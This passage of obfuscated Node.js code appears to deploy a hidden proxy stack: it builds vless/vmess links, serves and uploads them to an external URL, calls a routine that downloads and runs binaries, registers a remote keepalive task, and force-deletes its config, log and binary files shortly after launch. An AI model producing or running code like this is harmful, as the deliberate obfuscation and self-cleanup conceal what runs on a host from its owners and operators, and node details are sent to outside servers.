_0x1b0726={_0x2d83fb:0x11c,_0x27e545:0x172,_0x389b0c:0x17a,_0x61ebf9:0x139,_0x255810:0x148,_0xf15a8b:0xf9,_0x4c426c:0xf3,_0xf00c32:0x18a,_0x4f26cb:0x199,_0x5f4658:0x139,_0x2ac3b6:0x166},_0x2feea5={_0x767e8a:0x139,_0x52dd64:0x166,_0x200893:0x12c,_0xb35b47:0x187,_0x50f560:0xe8};setTimeout(()=>{const _0x58454d=_0x1f17,_0x5b1a40={'v':'2','ps':''+_0x1ca918,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x58454d(0x140),'net':'ws','type':'none','host':_0x12e972,'path':_0x58454d(0x156),'tls':_0x58454d(_0x1b0726._0x2d83fb),'sni':_0x12e972,'alpn':'','fp':_0x58454d(_0x1b0726._0x27e545)},_0xd65d7a=_0x58454d(_0x1b0726._0x389b0c)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x12e972+'&fp=firefox&type=ws&host='+_0x12e972+_0x58454d(0x17f)+_0x1ca918+'\x0a\x0avmess://'+Buffer[_0x58454d(_0x1b0726._0x61ebf9)](JSON[_0x58454d(_0x1b0726._0x255810)](_0x5b1a40))['toString'](_0x58454d(0x166))+_0x58454d(_0x1b0726._0xf15a8b)+UUID+'@'+CFIP+':'+CFPORT+_0x58454d(_0x1b0726._0x4c426c)+_0x12e972+_0x58454d(0x1ab)+_0x12e972+_0x58454d(0x151)+_0x1ca918+'\x0a\x20\x20\x20\x20';console[_0x58454d(_0x1b0726._0xf00c32)](Buffer[_0x58454d(0x139)](_0xd65d7a)[_0x58454d(0x194)](_0x58454d(0x166))),fs[_0x58454d(_0x1b0726._0x4f26cb)](subPath,Buffer[_0x58454d(_0x1b0726._0x5f4658)](_0xd65d7a)['toString'](_0x58454d(_0x1b0726._0x2ac3b6))),console[_0x58454d(0x18a)](FILE_PATH+_0x58454d(0x123)),uploadNodes(),app[_0x58454d(0x16c)]('/'+SUB_PATH,(_0x5b3afc,_0x5755ac)=>{const _0x1ac4e7=_0x58454d,_0x3c352e=Buffer[_0x1ac4e7(_0x2feea5._0x767e8a)](_0xd65d7a)[_0x1ac4e7(0x194)](_0x1ac4e7(_0x2feea5._0x52dd64));_0x5755ac[_0x1ac4e7(_0x2feea5._0x200893)](_0x1ac4e7(_0x2feea5._0xb35b47),'text/plain;\x20charset=utf-8'),_0x5755ac[_0x1ac4e7(_0x2feea5._0x50f560)](_0x3c352e);}),_0x28ec46(_0xd65d7a);},0x7d0);});}}async function uploadNodes(){const _0x167a15={_0x2a09e7:0x111,_0x5eef92:0x179,_0x42e0fc:0x12e,_0x158461:0x115,_0x59bfa2:0x186,_0x5c725f:0x148,_0x334fd9:0x15b,_0x4245e8:0x1a9,_0x43861b:0x18a},_0x49a11a=_0x20f165;if(UPLOAD_URL&&PROJECT_URL){const _0x3002d0=PROJECT_URL+'/'+SUB_PATH,_0x417196={'subscription':[_0x3002d0]};try{const _0x53b0e1=await axios[_0x49a11a(0x150)](UPLOAD_URL+_0x49a11a(0xe9),_0x417196,{'headers':{'Content-Type':'application/json'}});return _0x53b0e1&&_0x53b0e1['status']===0xc8?(console['log'](_0x49a11a(_0x167a15._0x2a09e7)),_0x53b0e1):null;}catch(_0x3dd6a2){if(_0x3dd6a2[_0x49a11a(0x179)]){if(_0x3dd6a2[_0x49a11a(_0x167a15._0x5eef92)][_0x49a11a(0x16f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x49a11a(_0x167a15._0x42e0fc)](listPath))return;const _0x6c31ca=fs['readFileSync'](listPath,_0x49a11a(_0x167a15._0x158461)),_0x4c5dde=_0x6c31ca[_0x49a11a(_0x167a15._0x59bfa2)]('\x0a')[_0x49a11a(0xe7)](_0x32e643=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x49a11a(0x10c)](_0x32e643));if(_0x4c5dde['length']===0x0)return;const _0x55a22f=JSON[_0x49a11a(_0x167a15._0x5c725f)]({'nodes':_0x4c5dde});try{const _0x53dd56=await axios['post'](UPLOAD_URL+_0x49a11a(_0x167a15._0x334fd9),_0x55a22f,{'headers':{'Content-Type':_0x49a11a(_0x167a15._0x4245e8)}});return _0x53dd56&&_0x53dd56[_0x49a11a(0x16f)]===0xc8?(console[_0x49a11a(_0x167a15._0x43861b)](_0x49a11a(0x116)),_0x53dd56):null;}catch(_0x47ff46){return null;}}else return;}}function _0x1f17(_0x250b17,_0x445e4b){const _0x485f26=_0x485f();return _0x1f17=function(_0x1f17e5,_0x4adfa1){_0x1f17e5=_0x1f17e5-0xe6;let _0x222eea=_0x485f26[_0x1f17e5];return _0x222eea;},_0x1f17(_0x250b17,_0x445e4b);}function cleanFiles(){setTimeout(()=>{const _0x2e52b6={_0x49c392:0x18a,_0x1a8cc4:0x18a},_0x39a068={_0x47381d:0x14a},_0x365c39=_0x1f17,_0x3d07c2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3d07c2[_0x365c39(0x153)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3d07c2['push'](phpPath);process['platform']===_0x365c39(0x10b)?exec('del\x20/f\x20/q\x20'+_0x3d07c2['join']('\x20')+'\x20>\x20nul\x202>&1',_0x151977=>{const _0x2a047a=_0x365c39;console[_0x2a047a(_0x39a068._0x47381d)](),console['log'](_0x2a047a(0x170)),console[_0x2a047a(0x18a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x365c39(0x16d)+_0x3d07c2['join']('\x20')+_0x365c39(0x10f),_0x6c6130=>{const _0x35458f=_0x365c39;console[_0x35458f(0x14a)](),console[_0x35458f(_0x2e52b6._0x49c392)](_0x35458f(0x170)),console[_0x35458f(_0x2e52b6._0x1a8cc4)](_0x35458f(0x105));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x30200b={_0x141ab5:0x18a,_0x15a92a:0x176,_0x1e2613:0x197,_0x14abca:0x17b},_0x25b672=_0x20f165;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x25b672(_0x30200b._0x141ab5)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x36c74d=await axios[_0x25b672(0x150)](_0x25b672(_0x30200b._0x15a92a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x25b672(0x1a9)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x36c74d;}catch(_0x3ebdb3){return console[_0x25b672(_0x30200b._0x1e2613)](_0x25b672(_0x30200b._0x14abca)+_0x3ebdb3[_0x25b672(0x198)]),null;}}async function startserver(){const _0x320be7={_0xb7515c:0x197,_0x46a363:0x14b},_0x19d098=_0x20f165;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xb1a300){console[_0x19d098(_0x320be7._0xb7515c)](_0x19d098(_0x320be7._0x46a363),_0xb1a300);}}startserver()[_0x20f165(0xf6)](_0x2e7bef=>{const _0x35dbe2=_0x20f165;console[_0x35dbe2(0x197)](_0x35dbe2(0xf4),_0x2e7bef);}),app['listen'](PORT,()=>console[_0x20f165(0x18a)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
